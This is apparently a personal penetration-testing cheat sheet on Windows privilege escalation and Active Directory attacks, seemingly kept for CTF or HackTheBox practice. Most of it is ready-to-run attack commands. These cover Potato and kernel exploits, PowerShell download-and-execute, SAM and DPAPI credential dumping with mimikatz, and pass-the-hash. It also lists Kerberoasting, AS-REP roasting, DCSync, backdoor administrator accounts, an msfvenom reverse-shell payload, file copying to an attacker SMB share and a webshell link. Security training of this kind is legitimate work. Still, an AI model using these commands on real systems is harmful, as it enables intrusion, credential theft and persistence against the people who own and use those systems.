# Memo

- History
  - Windows Me (2000)
  - Windows XP (2001)
  - Windows Vista (2006)
  - Windows 7 (2009)
  - Windows 8 (2012)
  - Windows 10 (2015)
  - Windows Server 2000
  - Windows Server 2003
  - Windows Server 2008
  - Windows Server 2012
  - Windows Server 2016
  - Windows Server 2019



- Potatoes
  - SMB Relay (to Host)
    - <= Windows Vista
    - <= Windows Server 2003 
    - MS08-068
    - responder (for LLMNT poisoning), MultiRelay
  - [Juicy Potato](https://github.com/ohpe/juicy-potato)
    - < Windows 10 1809
    - < Windows Server 2019 
    - SeImpersonatePrivilege or SeAssignPrimaryToken
    - [CLSID List](http://ohpe.it/juicy-potato/CLSID/)
  - [Rogue Potato](https://github.com/antonioCoco/RoguePotato)
    - \>= Windows 10 1809
    - \>= Windows Server 2019
    - SeImpersonatePrivilege or SeAssignPrimaryToken
  - [PrintPoofer](https://github.com/itm4n/PrintSpoofer)
    - \>= Windows 10
    - \>= Windows Server 2016/2019
    - SeImpersonatePrivilege



- Kernel Exploits
  - [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  - [Sherlock](https://github.com/rasta-mouse/Sherlock)
    - Find-AllVulns
    - MS10-015 ~ MS16-135 
  - Update Log
    - C:\Windows\SoftwareDistribution\Download\WindowsUpdate.log
  - checklist
    - check version, patch and cpu by systeminfo
      - does the exploit supported on 64-bit systems?
    - Is the shell that executes the exploit a 32-bit process or a 64-bit process?
      - sometimes WOW64 Filesystem Redirection cause problems 
  - MS10-092 (Sharlock)
    - Task Scheduler .XML
  - MS11-046
    -  'afd.sys' Local Privilege Escalation 
  - MS15-051 (Sharlock)
    - ClientCopyImage Win32k
    - Most reliable
  - MS16-032 (Sharlock)
    - Secondary Logon Handle



- checklist
  - Administrator is enabled?
    - runas /user:Administrator cmd.exe
    - UAC does not work with Administrator account.
    - All processes run with privileges
  - Are there any users who belong to the administrators group?
    - UAC bypass is required.
  - Administrator's 'password last set'
    - compare with file timestamps.



- remote control
  - psexec
    - users must  belong to the "Administrators" group
  - winrm, smbexec
    - winrm port 5985
  - [unicorn](https://gitlab.com/pentest-tools/unicorn)
    - powershell downgrade attack
  - powershell
    - encoding
      - echo -n "command" | iconv --to-code UTF-16LE | base64 -w 0
      - powershell -EncodedCommand
      - powershell -enc
    - download & exec
      - IEX (IWR http://example.com -UseBasicParsing)
    - bypass
      - type file.ps1 | powershell -noprofile -
      - cmd /c powershell
  - netcat
    - netcat may work when meterpreter don't work,
  - copy target to host
    - smbserver -smb2support public ./
    - copy file \\\\191.168.1.1\public\
  - [chisel](https://github.com/jpillora/chisel)
    - Chisel is a fast TCP/UDP tunnel
    - chisel server -p my_port --reverse
    - chisel client server_ip:server_port R:server_port:target_ip:target_port
  - meterpreter
    - migrate
    - kiwi_cmd



- credentials
  - cmdkey /list
    - Target: Domain:interactive=DOMAIN_NAME\user_name
    - Type: Domain Password
    - runas /user:domain_name\user_name /savecred  rshell.exe
  - DPAPI
    - mimikatz
    - whoami /user
    - dpapi::masterkey /in:file_name /sid:my_sid /password:my_password
    - dpapi::cred /in:file_name
  - SAM (/Window/System32/config)
    - privileged (Administrator) (Windows 7/ 8/ 10)
      - reg.exe save hklm\sam c:\temp\sam.save
      - reg.exe save hklm\system c:\temp\system.save
    - impacket-secretsdump  -sam SAM -system SYSTEM  local
    - pass the hash
      - smbmap -u user -p lmhash:nthash -H example.com
      - impacket-psexec -hashes lmhash:nthash user@example.com
    - decrypt
      - john --format=NT --wordlist=rockyou.txt hash.txt
      - NTLM
        - hashcat   -m 1000 --username hash.txt  rockyou.txt 
  - PSCredential
    - create
      - $password = ConvertTo-SecureString "passw0rd" -AsPlainText -Force
      - $cred = New-Object System.Management.Automation.PSCredential ('admin', $password)
    - from xml
      - $cred = Import-CliXml -Path "./creds.xml"
    - get password
      - need to login as a correct user
      - $cred.GetNetworkCredential().Password
  - dump process
    - firefox etc
    - procdump64.exe -ma pid



- tasks
  - "exe" extenstion is required
  - sc.exe qc service_name
  - sc.exe config service_name bin_path="C:\\..."



- Services
  - samba
    - SYSVOL
      - Group Policy (SYSVOL/*/Groups.xml)
        - cPassword
        - MS14-025
    - Alternative Data Stream
      - allinfo file_name
      - get file_name:id
  - rpc
    - rpcclient
      - enumdomusers
      - lsaquery
      - queryuser
      - lookupnames administrator
        - administrator SID is always "S-1-5-21-?????????????-??????????????-???????????-500"
      - lookupsids S-1-5-21-?????????????-??????????????-???????????-XXXX
    - lookupsid user:password@192.168.1.1
  - ldap
    - root DSE
      - ldapsearch -x -h ldap_server.com  -s base
    - search (guest)
      - ldapsearch -x -h ldap_server.com -b "dc=example,dc=com"
    - seach (authenticate)
      - ldapsearch -x -D user@domain -w password -h example.com -b "dc=example,dc=com"
        - D options specify a userPrincipalName or DN
          - userPrincipalName: user@domain
          - DN: CN=Your Name,CN=Users,DC=example,DC=com
            - case-insensitive
      - GetADUsers  -all -dc-ip 192.168.1.1  domain/user
    - add DNS record ([krbrelayx](https://github.com/dirkjanm/krbrelayx))
      - dnstool.py  -u 'domain\user_name' -p 'password' -a add -r sub.example.com -d target-ip example.com
    - gMSA ([gMSADumper](https://github.com/micahvandeusen/gMSADumper))
      - msDS-ManagedPassword*
      - gMSADumper.py  -u user_name -p password -d example.com
    - delegate
      - msDS-AllowedToDelegateTo
      -  msDS-AllowedToActOnBehalfOfOtherIdentity
      - Delegation Attack
  - dns
    - sub domains
      - dnsrecon -d example.com -r 192.168.1.0/24 -n 8.8.8.8
    - zone transfer
      - dig @8.8.8.8 example.com axfr
    - nsupdate (bind)
      - update add my-host.com 30 IN A 192.168.1.1
      - update add 1.1.168.192.in-addr.arpa. 30 PTR my-host.com
  - kerberos
    - Pre-Auth Bruteforce
      - [kerbrute](https://github.com/ropnop/kerbrute)
        - kerbrute userenum --dc target_domain -d example.com users.txt
    - AS-REP Roasting
      - get user (client) passwords
      - GetNPUsers  domain/ -request  -dc-ip 192.168.1.1
    - Kerberoasting
      - get user passwords associated with the service (TGS)
      - GetUserSPNs domainl/user  -request -dc-ip 192.168.1.1
    - Delegation Attack
      - getST.py -spn spn -dc-ip ip -impersonate Administrator domain/user:password
      - users authenticate to services via other protocols, such as NTLM or even form-based authentication, and so they do not send a TGS to the service. In such cases, a service can invoke S4U2Self to ask the authentication service to produce a TGS for arbitrary users to itself, which can then be used as “evidence” when invoking S4U2Proxy. This feature allows impersonating users out of thin air, and it is only possible when the TrustedToAuthForDelegation flag is set for the service account that invokes S4U2Self. 
        - If the service does not have a TGS,. the S4U2Self will create a TGS
        - if the service has a TGS, do nothing
        - S4U2Proxy receives a TGS from th service and processes it
    - [other attacks](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
      - Golden Ticket
        - create a new user ticket from TGT ntlm hash
      - DCSync 
        - [DS-Replication-Get-Changes, DS-Replication-Get-Changes-All](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)  are required
          - Add-DomainObjectACL
        - leak ntds.dit
          - secretsdump.py domain/user@192.168.1.1

- etc
  - os command injection
    - command
      - timeout
      - ping
      - cmd.exe /c powershell ... 
    - download
      - certutil, rundll32, regsvr32, ...
    - add user
      - net user user_name password /add
      - net localgroup administrators user_name /add
  - pwn
    - [Get-PESecurity](https://github.com/NetSPI/PESecurity)
    - msfvenom -p windows/shell_reverse_tcp lhost=10.10.17.187 lport=4444 -b '\x00\x0A\x0D' -f python 
  - .NET
    - [dnspy](https://github.com/dnSpy/dnSpy)
  - asp/aspx
    - [aspx webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)



# Tools

- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [JAWS](https://github.com/411Hall/JAWS.git)
- [PowerTools/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools)
- [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
- [Nishang](https://github.com/samratashok/nishang)
- [Sysinternals suite](https://docs.microsoft.com/ja-jp/sysinternals/downloads/sysinternals-suite)

# Reference

- [NTLM Relay is dead, Long live NTLM Relay](https://conference.hitb.org/hitbsecconf2018dxb/materials/D2T2%20-%20NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20Wang%20and%20Junyu%20Zhou.pdf)
- [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Windows Kernel Exploit Cheat Sheet for HackTheBox](https://kakyouim.hatenablog.com/entry/2020/05/27/010807)
- [get-reverse-shell-via-windows-one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- [Kerberoasting - Part 1](https://malicious.link/post/2016/kerberoast-pt1/)
- [パスワードってどこにあるの？その2](https://www.mbsd.jp/blog/20190520.html)
- [Kerberos への攻撃手法](https://owlinux1000.github.io/blog/blog/krb5_attacks_101/)
- [How To Attack Kerberos 101](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
- [enum Account by MS-RPC](https://phantom37383.blog.fc2.com/blog-entry-1257.html)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
- [Penetration Testing Active Directory, Part II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)

